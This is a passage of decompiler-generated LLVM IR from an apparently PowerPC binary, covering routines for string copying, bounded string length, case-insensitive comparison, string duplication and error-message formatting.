  %v3_10007458 = load i8, i8* %v2_10007458, align 1
  %v3_1000745c = icmp eq i8 %v3_10007458, 0
  store i1 %v3_1000745c, i1* %cr7_eq.global-to-local, align 1
  %v3_10007460 = add i32 %v2_10007438, 3
  %v4_10007460 = inttoptr i32 %v3_10007460 to i8*
  store i8 %v3_10007458, i8* %v4_10007460, align 1
  store i32 %v3_10007460, i32* %r10.global-to-local, align 4
  %v0_10007464 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007464, label %dec_label_pc_10007480, label %dec_label_pc_10007468

dec_label_pc_10007468:                            ; preds = %dec_label_pc_10007458
  %v0_10007468 = load i32, i32* %r8.global-to-local, align 4
  %v1_10007468 = add i32 %v0_10007468, 1
  %v2_10007468 = inttoptr i32 %v1_10007468 to i8*
  %v3_10007468 = load i8, i8* %v2_10007468, align 1
  %v3_1000746c = icmp eq i8 %v3_10007468, 0
  store i1 %v3_1000746c, i1* %cr7_eq.global-to-local, align 1
  %v3_10007470 = add i32 %v2_10007438, 4
  %v4_10007470 = inttoptr i32 %v3_10007470 to i8*
  store i8 %v3_10007468, i8* %v4_10007470, align 1
  store i32 %v3_10007470, i32* %r10.global-to-local, align 4
  %v0_10007474 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007474, label %dec_label_pc_10007480, label %dec_label_pc_10007478

dec_label_pc_10007478:                            ; preds = %dec_label_pc_10007468
  %v0_10007478 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007478 = add i32 %v0_10007478, -1
  store i32 %v1_10007478, i32* %ctr.global-to-local, align 4
  %v2_10007478 = icmp eq i32 %v1_10007478, 0
  br i1 %v2_10007478, label %dec_label_pc_10007494, label %dec_label_pc_10007428

dec_label_pc_10007480:                            ; preds = %dec_label_pc_10007468, %dec_label_pc_10007458, %dec_label_pc_10007440, %dec_label_pc_10007428
  %v1_10007480 = phi i32 [ %v3_10007470, %dec_label_pc_10007468 ], [ %v3_10007460, %dec_label_pc_10007458 ], [ %v3_10007450, %dec_label_pc_10007440 ], [ %v3_10007438, %dec_label_pc_10007428 ]
  %v2_1000748011 = sub i32 %arg1, %v1_10007480
  %v2_10007484 = add i32 %v2_1000748011, %arg2
  %v1_10007488 = add i32 %v2_10007484, -1
  store i32 %v1_10007488, i32* %r11.global-to-local, align 4
  %v4_10007488 = icmp eq i32 %v1_10007488, 0
  %v0_1000748c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10007488, i32 %v0_1000748c)
  %v2_100074c4.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100074bc

dec_label_pc_10007494:                            ; preds = %dec_label_pc_10007478, %dec_label_pc_10007414
  %v1_10007494 = urem i32 %arg2, 4
  store i32 %v1_10007494, i32* %r11.global-to-local, align 4
  %v3_10007494 = icmp eq i32 %v1_10007494, 0
  %v0_10007498 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10007494, i32 %v0_10007498)
  store i32 %v1_10007494, i32* %ctr.global-to-local, align 4
  %v2_100074b0.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100074a0

dec_label_pc_100074a0:                            ; preds = %dec_label_pc_100074b8.dec_label_pc_100074a0_crit_edge, %dec_label_pc_10007494
  %v2_100074b0 = phi i32 [ %v3_100074b0, %dec_label_pc_100074b8.dec_label_pc_100074a0_crit_edge ], [ %v2_100074b0.pre, %dec_label_pc_10007494 ]
  %v0_100074a4 = phi i32 [ %v0_100074a4.pre, %dec_label_pc_100074b8.dec_label_pc_100074a0_crit_edge ], [ %v1_10007494, %dec_label_pc_10007494 ]
  %v0_100074a0 = load i32, i32* @r4, align 4
  %v1_100074a0 = inttoptr i32 %v0_100074a0 to i8*
  %v2_100074a0 = load i8, i8* %v1_100074a0, align 1
  %v1_100074a4 = add i32 %v0_100074a4, -1
  store i32 %v1_100074a4, i32* %r11.global-to-local, align 4
  %v1_100074a8 = add i32 %v0_100074a0, 1
  store i32 %v1_100074a8, i32* @r4, align 4
  %v3_100074ac = icmp eq i8 %v2_100074a0, 0
  store i1 %v3_100074ac, i1* %cr7_eq.global-to-local, align 1
  %v3_100074b0 = add i32 %v2_100074b0, 1
  %v4_100074b0 = inttoptr i32 %v3_100074b0 to i8*
  store i8 %v2_100074a0, i8* %v4_100074b0, align 1
  store i32 %v3_100074b0, i32* %r10.global-to-local, align 4
  %v0_100074b4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100074b4 = add i32 %v0_100074b4, -1
  store i32 %v1_100074b4, i32* %ctr.global-to-local, align 4
  %v2_100074b4 = icmp eq i32 %v1_100074b4, 0
  br i1 %v2_100074b4, label %dec_label_pc_100074cc, label %dec_label_pc_100074b8

dec_label_pc_100074b8:                            ; preds = %dec_label_pc_100074a0
  %v0_100074b8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100074b8, label %dec_label_pc_100074bc, label %dec_label_pc_100074b8.dec_label_pc_100074a0_crit_edge

dec_label_pc_100074b8.dec_label_pc_100074a0_crit_edge: ; preds = %dec_label_pc_100074b8
  %v0_100074a4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100074a0

dec_label_pc_100074bc:                            ; preds = %dec_label_pc_100074b8, %dec_label_pc_10007480
  %v2_100074c4.pre = phi i32 [ %v2_100074c4.pre.pre, %dec_label_pc_10007480 ], [ %v3_100074b0, %dec_label_pc_100074b8 ]
  %v0_100074bc = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100074bc, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100074c0

dec_label_pc_100074c0:                            ; preds = %dec_label_pc_100074c0, %dec_label_pc_100074bc
  %v2_100074c4 = phi i32 [ %v3_100074c4, %dec_label_pc_100074c0 ], [ %v2_100074c4.pre, %dec_label_pc_100074bc ]
  %v3_100074c4 = add i32 %v2_100074c4, 1
  %v4_100074c4 = inttoptr i32 %v3_100074c4 to i8*
  store i8 0, i8* %v4_100074c4, align 1
  store i32 %v3_100074c4, i32* %r10.global-to-local, align 4
  %v0_100074c8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100074c8 = add i32 %v0_100074c8, -1
  store i32 %v1_100074c8, i32* %ctr.global-to-local, align 4
  %v2_100074c8 = icmp eq i32 %v1_100074c8, 0
  br i1 %v2_100074c8, label %dec_label_pc_100074cc, label %dec_label_pc_100074c0

dec_label_pc_100074cc:                            ; preds = %dec_label_pc_100074a0, %dec_label_pc_100074c0
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_100074c8, { 1, 0 }
  uselistorder i32 %v3_100074c4, { 1, 2, 0 }
  uselistorder i32 %v1_100074b4, { 1, 0 }
  uselistorder i32 %v3_100074b0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10007494, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10007478, { 1, 0 }
  uselistorder i32 %v3_10007470, { 0, 2, 3, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100074cc, { 1, 0 }
}

define i32 @function_100074d0(i8* %arg1) local_unnamed_addr {
dec_label_pc_100074d0:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_100074d0 = load i32, i32* @r4, align 4
  %v3_100074d0 = icmp eq i32 %v0_100074d0, 0
  %v0_100074dc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100074d0, i32 %v0_100074dc)
  %v1_100074ec = load i32, i32* @r4, align 4
  %v2_100074ec = add i32 %v1_100074ec, %tmp
  %v3_100074f0 = icmp ugt i32 %v2_100074ec, %tmp
  %v4_100074f0 = icmp eq i32 %v1_100074ec, 0
  %v2_100074f4 = or i1 %v4_100074f0, %v3_100074f0
  br i1 %v2_100074f4, label %dec_label_pc_100074fc, label %dec_label_pc_100074f8

dec_label_pc_100074e4:                            ; preds = %dec_label_pc_10007564
  br label %dec_label_pc_100075a8

dec_label_pc_100074f8:                            ; preds = %dec_label_pc_100074d0
  br label %dec_label_pc_100074fc

dec_label_pc_100074fc:                            ; preds = %dec_label_pc_100074d0, %dec_label_pc_100074f8
  %v0_100075ac = phi i32 [ %v2_100074ec, %dec_label_pc_100074d0 ], [ -1, %dec_label_pc_100074f8 ]
  %v1_1000752c6 = urem i32 %tmp, 4
  %v3_1000752c8 = icmp eq i32 %v1_1000752c6, 0
  br i1 %v3_1000752c8, label %dec_label_pc_10007534, label %dec_label_pc_10007504

dec_label_pc_10007504:                            ; preds = %dec_label_pc_100074fc, %dec_label_pc_10007528
  %v0_1000751c = phi i32 [ %v1_10007528, %dec_label_pc_10007528 ], [ %tmp, %dec_label_pc_100074fc ]
  %v1_10007504 = inttoptr i32 %v0_1000751c to i8*
  %v2_10007504 = load i8, i8* %v1_10007504, align 1
  %v3_10007508 = icmp eq i8 %v2_10007504, 0
  br i1 %v3_10007508, label %dec_label_pc_10007510, label %dec_label_pc_10007528

dec_label_pc_10007510:                            ; preds = %dec_label_pc_10007504
  %v3_10007510 = icmp ugt i32 %v0_100075ac, %v0_1000751c
  %v0_1000751c.v0_100075ac = select i1 %v3_10007510, i32 %v0_1000751c, i32 %v0_100075ac
  %v2_10007520 = sub i32 %v0_1000751c.v0_100075ac, %tmp
  ret i32 %v2_10007520

dec_label_pc_10007528:                            ; preds = %dec_label_pc_10007504
  %v1_10007528 = add i32 %v0_1000751c, 1
  %v1_1000752c = urem i32 %v1_10007528, 4
  %v3_1000752c = icmp eq i32 %v1_1000752c, 0
  br i1 %v3_1000752c, label %dec_label_pc_10007534, label %dec_label_pc_10007504

dec_label_pc_10007534:                            ; preds = %dec_label_pc_10007528, %dec_label_pc_100074fc
  %v0_10007538 = phi i32 [ %tmp, %dec_label_pc_100074fc ], [ %v1_10007528, %dec_label_pc_10007528 ]
  %v2_100075a03 = icmp ult i32 %v0_10007538, %v0_100075ac
  br i1 %v2_100075a03, label %dec_label_pc_10007544, label %dec_label_pc_100075a8

dec_label_pc_10007544:                            ; preds = %dec_label_pc_10007534, %dec_label_pc_1000759c
  %v0_100074e4 = phi i32 [ %v1_10007548, %dec_label_pc_1000759c ], [ %v0_10007538, %dec_label_pc_10007534 ]
  %v1_10007544 = inttoptr i32 %v0_100074e4 to i32*
  %v2_10007544 = load i32, i32* %v1_10007544, align 4
  %v1_10007548 = add i32 %v0_100074e4, 4
  %v1_10007550 = add i32 %v0_100074e4, 1
  %v1_10007558 = add i32 %v2_10007544, -16843009
  %v2_1000755c = and i32 %v1_10007558, -2139062144
  %v5_1000755c = icmp eq i32 %v2_1000755c, 0
  br i1 %v5_1000755c, label %dec_label_pc_1000759c, label %dec_label_pc_10007564

dec_label_pc_10007564:                            ; preds = %dec_label_pc_10007544
  %v2_10007564 = inttoptr i32 %v0_100074e4 to i8*
  %v3_10007564 = load i8, i8* %v2_10007564, align 1
  %v3_10007568 = icmp eq i8 %v3_10007564, 0
  br i1 %v3_10007568, label %dec_label_pc_100074e4, label %dec_label_pc_10007570

dec_label_pc_10007570:                            ; preds = %dec_label_pc_10007564
  %v2_10007570 = inttoptr i32 %v1_10007550 to i8*
  %v3_10007570 = load i8, i8* %v2_10007570, align 1
  %v3_10007574 = icmp eq i8 %v3_10007570, 0
  br i1 %v3_10007574, label %dec_label_pc_100075a8, label %dec_label_pc_1000757c

dec_label_pc_1000757c:                            ; preds = %dec_label_pc_10007570
  %v1_1000757c = add i32 %v0_100074e4, 2
  %v2_1000757c = inttoptr i32 %v1_1000757c to i8*
  %v3_1000757c = load i8, i8* %v2_1000757c, align 1
  %v3_10007584 = icmp eq i8 %v3_1000757c, 0
  br i1 %v3_10007584, label %dec_label_pc_100075a8, label %dec_label_pc_1000758c

dec_label_pc_1000758c:                            ; preds = %dec_label_pc_1000757c
  %v1_1000758c = add i32 %v0_100074e4, 3
  %v2_1000758c = inttoptr i32 %v1_1000758c to i8*
  %v3_1000758c = load i8, i8* %v2_1000758c, align 1
  %v3_10007594 = icmp eq i8 %v3_1000758c, 0
  br i1 %v3_10007594, label %dec_label_pc_100075a8, label %dec_label_pc_1000759c

dec_label_pc_1000759c:                            ; preds = %dec_label_pc_1000758c, %dec_label_pc_10007544
  %v2_100075a0 = icmp ult i32 %v1_10007548, %v0_100075ac
  br i1 %v2_100075a0, label %dec_label_pc_10007544, label %dec_label_pc_100075a8

dec_label_pc_100075a8:                            ; preds = %dec_label_pc_1000759c, %dec_label_pc_10007570, %dec_label_pc_1000757c, %dec_label_pc_1000758c, %dec_label_pc_10007534, %dec_label_pc_100074e4
  %v0_100075b4 = phi i32 [ %v0_100074e4, %dec_label_pc_100074e4 ], [ %v0_10007538, %dec_label_pc_10007534 ], [ %v1_1000758c, %dec_label_pc_1000758c ], [ %v1_1000757c, %dec_label_pc_1000757c ], [ %v1_10007550, %dec_label_pc_10007570 ], [ %v0_100075ac, %dec_label_pc_1000759c ]
  %v3_100075a8 = icmp ugt i32 %v0_100075ac, %v0_100075b4
  %v0_100075b4.v0_100075ac = select i1 %v3_100075a8, i32 %v0_100075b4, i32 %v0_100075ac
  %v2_100075b8 = sub i32 %v0_100075b4.v0_100075ac, %tmp
  ret i32 %v2_100075b8

; uselistorder directives
  uselistorder i32 %v1_10007548, { 1, 0 }
  uselistorder i32 %v0_100074e4, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_10007538, { 1, 0, 2 }
  uselistorder i32 %v1_10007528, { 1, 0, 2 }
  uselistorder i32 %v0_1000751c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_100075ac, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_100074ec, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 1, 5, 6, 0, 4 }
  uselistorder label %dec_label_pc_100075a8, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_10007544, { 1, 0 }
  uselistorder label %dec_label_pc_10007504, { 1, 0 }
  uselistorder label %dec_label_pc_100074fc, { 1, 0 }
}

define i32 @function_100075c0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100075c0:
  store i32 %arg1, i32* @r4, align 4
  store i32 268465624, i32* @lr, align 4
  %v0_100075d4 = call i32 @function_100075f0()
  %v0_100075dc = load i32, i32* @r29, align 4
  ret i32 %v0_100075dc
}

define i32 @function_100075f0() local_unnamed_addr {
dec_label_pc_100075f0:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_100075f8 = load i32, i32* @r3, align 4
  %v2_100075f8 = icmp ugt i32 %v0_100075f8, 124
  %v0_10007600 = load i32, i32* @r4, align 4
  store i32 %v0_10007600, i32* %r27.global-to-local, align 4
  %v0_10007608 = load i32, i32* @r5, align 4
  br i1 %v2_100075f8, label %dec_label_pc_1000764c, label %dec_label_pc_10007610

dec_label_pc_10007610:                            ; preds = %dec_label_pc_100075f0
  store i32 ptrtoint ([8 x i8]* @global_var_1000e688.256 to i32), i32* %r30.global-to-local, align 4
  %v3_100076344 = icmp eq i32 %v0_100075f8, 0
  br i1 %v3_100076344, label %dec_label_pc_10007640, label %dec_label_pc_10007620

dec_label_pc_10007620:                            ; preds = %dec_label_pc_10007610, %dec_label_pc_10007620
  %v0_10007624 = phi i32 [ %v1_10007624, %dec_label_pc_10007620 ], [ ptrtoint ([8 x i8]* @global_var_1000e688.256 to i32), %dec_label_pc_10007610 ]
  %v1_10007624 = add i32 %v0_10007624, 1
  store i32 %v1_10007624, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10007620

dec_label_pc_10007640:                            ; preds = %dec_label_pc_10007610
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10007680

dec_label_pc_1000764c:                            ; preds = %dec_label_pc_100075f0
  %tmp = icmp slt i32 %v0_100075f8, 0
  %v1_10007650 = zext i1 %tmp to i32
  %v2_10007650 = ashr i32 %v0_100075f8, 31
  %v3_10007650 = and i32 %v2_10007650, -2
  %v4_10007650 = or i32 %v3_10007650, %v1_10007650
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_10007664 = bitcast i32* %stack_var_-39 to i8*
  %v6_10007664 = call i32 @function_1000a070(i8* %v5_10007664, i32 %v4_10007650, i32 %v0_100075f8, i32 -10, i32 0)
  %v1_1000766c = add i32 %v6_10007664, -14
  store i32 %v1_1000766c, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1000e678.257 to i32), i32* @r4, align 4
  store i32 %v1_1000766c, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268465792, i32* @lr, align 4
  %v0_1000767c = call i32 @function_10007104()
  %v0_10007680.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_10007684.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_10007694.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10007680

dec_label_pc_10007680:                            ; preds = %dec_label_pc_10007640, %dec_label_pc_1000764c
  %v0_10007694 = phi i32 [ %v0_10007608, %dec_label_pc_10007640 ], [ %v0_10007694.pre, %dec_label_pc_1000764c ]
  %v0_10007684 = phi i32 [ ptrtoint ([8 x i8]* @global_var_1000e688.256 to i32), %dec_label_pc_10007640 ], [ %v0_10007684.pre, %dec_label_pc_1000764c ]
  %v1_10007688 = phi i32 [ %v0_10007600, %dec_label_pc_10007640 ], [ %v0_10007680.pre, %dec_label_pc_1000764c ]
  %tmp21 = icmp slt i32 %v1_10007688, 0
  %v1_10007680 = zext i1 %tmp21 to i32
  %v2_10007680 = ashr i32 %v1_10007688, 31
  %v3_10007680 = and i32 %v2_10007680, -2
  %v4_10007680 = or i32 %v3_10007680, %v1_10007680
  store i32 %v0_10007684, i32* @r3, align 4
  %v2_10007688 = xor i32 %v4_10007680, %v1_10007688
  %v2_1000768c = sub i32 %v4_10007680, %v2_10007688
  %tmp22 = icmp slt i32 %v2_1000768c, 0
  %v1_10007690 = zext i1 %tmp22 to i32
  %v2_10007690 = ashr i32 %v2_1000768c, 31
  %v3_10007690 = and i32 %v2_10007690, -2
  %v4_10007690 = or i32 %v3_10007690, %v1_10007690
  %v2_10007694 = and i32 %v4_10007690, %v0_10007694
  store i32 %v2_10007694, i32* @r29, align 4
  %v0_10007698 = call i32 @function_10007284()
  %v1_1000769c = add i32 %v0_10007698, 1
  store i32 %v1_1000769c, i32* %r31.global-to-local, align 4
  %v1_100076a0 = load i32, i32* @r29, align 4
  %v3_100076a0 = icmp ugt i32 %v1_1000769c, %v1_100076a0
  br i1 %v3_100076a0, label %dec_label_pc_100076a8, label %dec_label_pc_100076b0

dec_label_pc_100076a8:                            ; preds = %dec_label_pc_10007680
  store i32 %v1_100076a0, i32* %r31.global-to-local, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100076b0

dec_label_pc_100076b0:                            ; preds = %dec_label_pc_10007680, %dec_label_pc_100076a8
  %v0_100076c0 = phi i32 [ %v1_100076a0, %dec_label_pc_100076a8 ], [ %v1_1000769c, %dec_label_pc_10007680 ]
  %v3_100076b0 = icmp eq i32 %v0_100076c0, 0
  br i1 %v3_100076b0, label %dec_label_pc_100076d4, label %dec_label_pc_100076b8

dec_label_pc_100076b8:                            ; preds = %dec_label_pc_100076b0
  %v0_100076b8 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100076b8, i32* @r4, align 4
  %v0_100076bc = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_100076bc, i32* @r3, align 4
  store i32 %v0_100076c0, i32* @r5, align 4
  store i32 268465864, i32* @lr, align 4
  %v0_100076c4 = call i32 @function_10007104()
  %v1_100076c8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100076c8 = add i32 %v1_100076c8, %v0_100076bc
  %v3_100076d0 = add i32 %v2_100076c8, -1
  %v4_100076d0 = inttoptr i32 %v3_100076d0 to i8*
  store i8 0, i8* %v4_100076d0, align 1
  br label %dec_label_pc_100076d4

dec_label_pc_100076d4:                            ; preds = %dec_label_pc_100076b0, %dec_label_pc_100076b8
  %v0_100076d4 = load i32, i32* %r28.global-to-local, align 4
  %v3_100076d4 = icmp eq i32 %v0_100076d4, 0
  br i1 %v3_100076d4, label %dec_label_pc_100076e4, label %dec_label_pc_100076dc

dec_label_pc_100076dc:                            ; preds = %dec_label_pc_100076d4
  %v0_100076dc = call i32 @function_10004e38()
  %v0_100076e0 = load i32, i32* %r28.global-to-local, align 4
  %v2_100076e0 = inttoptr i32 %v0_100076dc to i32*
  store i32 %v0_100076e0, i32* %v2_100076e0, align 4
  %v0_100076e8.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100076e4

dec_label_pc_100076e4:                            ; preds = %dec_label_pc_100076d4, %dec_label_pc_100076dc
  %v0_100076e8 = phi i32 [ 0, %dec_label_pc_100076d4 ], [ %v0_100076e8.pre, %dec_label_pc_100076dc ]
  ret i32 %v0_100076e8

; uselistorder directives
  uselistorder i32 %v2_1000768c, { 1, 0 }
  uselistorder i32 %v4_10007680, { 1, 0 }
  uselistorder i32 %v1_10007688, { 1, 2, 0 }
  uselistorder i32 %v1_10007624, { 1, 0 }
  uselistorder i32 %v0_100075f8, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r28.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1000e688.256 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_100076e4, { 1, 0 }
  uselistorder label %dec_label_pc_100076d4, { 1, 0 }
  uselistorder label %dec_label_pc_100076b0, { 1, 0 }
  uselistorder label %dec_label_pc_10007680, { 1, 0 }
  uselistorder label %dec_label_pc_10007620, { 1, 0 }
}

define i32 @function_100076fc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100076fc:
  %v2_10007708 = call i32 @function_1000a968(i32 %arg2, i32 %arg1)
  ret i32 %v2_10007708
}

define i32 @function_1000770c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000770c:
  %v3_10007710 = load i32, i32* bitcast (i32** @global_var_10010454.258 to i32*), align 4
  %v0_10007718.pre = load i32, i32* @r3, align 4
  %v1_10007718.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10007718

dec_label_pc_10007718:                            ; preds = %dec_label_pc_10007740, %dec_label_pc_1000770c
  %v0_100077546 = phi i32 [ %v0_100077547, %dec_label_pc_10007740 ], [ 0, %dec_label_pc_1000770c ]
  %v0_10007744 = phi i32 [ %v1_10007744, %dec_label_pc_10007740 ], [ %v1_10007718.pre, %dec_label_pc_1000770c ]
  %v0_10007748 = phi i32 [ %v1_10007748, %dec_label_pc_10007740 ], [ %v0_10007718.pre, %dec_label_pc_1000770c ]
  %v4_10007718 = icmp eq i32 %v0_10007748, %v0_10007744
  %.pre = inttoptr i32 %v0_10007748 to i8*
  br i1 %v4_10007718, label %dec_label_pc_10007740, label %dec_label_pc_10007720

dec_label_pc_10007720:                            ; preds = %dec_label_pc_10007718
  %v2_10007720 = load i8, i8* %.pre, align 1
  %v3_10007720 = zext i8 %v2_10007720 to i32
  %v1_10007724 = inttoptr i32 %v0_10007744 to i8*
  %v2_10007724 = load i8, i8* %v1_10007724, align 1
  %v3_10007724 = zext i8 %v2_10007724 to i32
  %v1_10007728 = mul nuw nsw i32 %v3_10007720, 2
  %v1_1000772c = mul nuw nsw i32 %v3_10007724, 2
  %v2_10007730 = add i32 %v1_10007728, %v3_10007710
  %v3_10007730 = inttoptr i32 %v2_10007730 to i16*
  %v4_10007730 = load i16, i16* %v3_10007730, align 2
  %v5_10007730 = sext i16 %v4_10007730 to i32
  %v2_10007734 = add i32 %v1_1000772c, %v3_10007710
  %v3_10007734 = inttoptr i32 %v2_10007734 to i16*
  %v4_10007734 = load i16, i16* %v3_10007734, align 2
  %v5_10007734 = sext i16 %v4_10007734 to i32
  %v2_10007738 = sub nsw i32 %v5_10007730, %v5_10007734
  %v4_1000773c = icmp eq i16 %v4_10007730, %v4_10007734
  br i1 %v4_1000773c, label %dec_label_pc_10007740, label %dec_label_pc_10007754

dec_label_pc_10007740:                            ; preds = %dec_label_pc_10007718, %dec_label_pc_10007720
  %v0_100077547 = phi i32 [ %v2_10007738, %dec_label_pc_10007720 ], [ %v0_100077546, %dec_label_pc_10007718 ]
  %v2_10007740 = load i8, i8* %.pre, align 1
  %v1_10007744 = add i32 %v0_10007744, 1
  %v1_10007748 = add i32 %v0_10007748, 1
  %v3_1000774c = icmp eq i8 %v2_10007740, 0
  br i1 %v3_1000774c, label %dec_label_pc_10007754, label %dec_label_pc_10007718

dec_label_pc_10007754:                            ; preds = %dec_label_pc_10007740, %dec_label_pc_10007720
  %v0_10007754 = phi i32 [ %v0_100077547, %dec_label_pc_10007740 ], [ %v2_10007738, %dec_label_pc_10007720 ]
  ret i32 %v0_10007754

; uselistorder directives
  uselistorder i32 %v2_10007738, { 1, 0 }
  uselistorder i32 %v0_10007748, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007740, { 1, 0 }
}

define i32 @function_1000775c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000775c:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_10007770 = call i32 @function_10007284()
  %v1_10007774 = add i32 %v0_10007770, 1
  store i32 %v1_10007774, i32* @r29, align 4
  store i32 %v1_10007774, i32* @r3, align 4
  store i32 268466048, i32* @lr, align 4
  %v0_1000777c = call i32 @function_1000809c()
  store i32 %v0_1000777c, i32* @r3, align 4
  %v0_10007780 = load i32, i32* @r28, align 4
  store i32 %v0_10007780, i32* @r4, align 4
  store i32 %v0_1000777c, i32* @r31, align 4
  %v3_10007784 = icmp eq i32 %v0_1000777c, 0
  %v0_10007788 = load i32, i32* @r29, align 4
  store i32 %v0_10007788, i32* @r5, align 4
  br i1 %v3_10007784, label %dec_label_pc_10007794, label %dec_label_pc_10007790

dec_label_pc_10007790:                            ; preds = %dec_label_pc_1000775c
  store i32 268466068, i32* @lr, align 4
  %v0_10007790 = call i32 @function_10007104()
  %v0_10007798.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007794

dec_label_pc_10007794:                            ; preds = %dec_label_pc_1000775c, %dec_label_pc_10007790
  %v0_10007798 = phi i32 [ 0, %dec_label_pc_1000775c ], [ %v0_10007798.pre, %dec_label_pc_10007790 ]
  ret i32 %v0_10007798

; uselistorder directives
  uselistorder label %dec_label_pc_10007794, { 1, 0 }
}

define i32 @function_100077ac(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100077ac:
  store i32 ptrtoint (i32* @global_var_1001049c.259 to i32), i32* @r5, align 4
  %v1_100077b4 = call i32 @function_1000ac3c(i32 ptrtoint (i32* @global_var_1001049c.259 to i32))
  ret i32 %v1_100077b4
}

define i32 @function_100077b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_100077b8:
  %stack_var_-72 = alloca i32, align 4
  store i32 268466124, i32* @lr, align 4
  %v2_100077c8 = call i32 @function_100077e4(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @function_100077e4, { 1, 0 }
}

define i32 @function_100077e4(i32* %arg1) local_unnamed_addr {
dec_label_pc_100077e4:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_2()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_100077e8 = load i32, i32* @lr, align 4
  store i32 %v0_100077e8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_100077f8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268466188, i32* @lr, align 4
  %v3_10007808 = call i32 @function_100049cc(i32 1076655123, i32 %v2_100077f8, i32 %v2_100077f8)
  %v2_1000780c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000780c, i32* @r4, align 4
  store i32 %v3_10007808, i32* @r30, align 4
  %v3_10007810 = icmp eq i32 %v3_10007808, 0
  store i32 19, i32* @r5, align 4
  %v0_10007818 = load i32, i32* @r31, align 4
  br i1 %v3_10007810, label %dec_label_pc_10007820, label %dec_label_pc_10007868

dec_label_pc_10007820:                            ; preds = %dec_label_pc_100077e4
  %v1_10007818 = add i32 %v0_10007818, 17
  %v3_10007838 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10007838, i32* %r0.global-to-local, align 4
  %v2_1000783c = add i32 %v0_10007818, 4
  %v3_1000783c = inttoptr i32 %v2_1000783c to i32*
  store i32 %tmp7, i32* %v3_1000783c, align 4
  %v0_10007840 = load i32, i32* %r11.global-to-local, align 4
  %v1_10007840 = load i32, i32* @r31, align 4
  %v2_10007840 = add i32 %v1_10007840, 8
  %v3_10007840 = inttoptr i32 %v2_10007840 to i32*
  store i32 %v0_10007840, i32* %v3_10007840, align 4
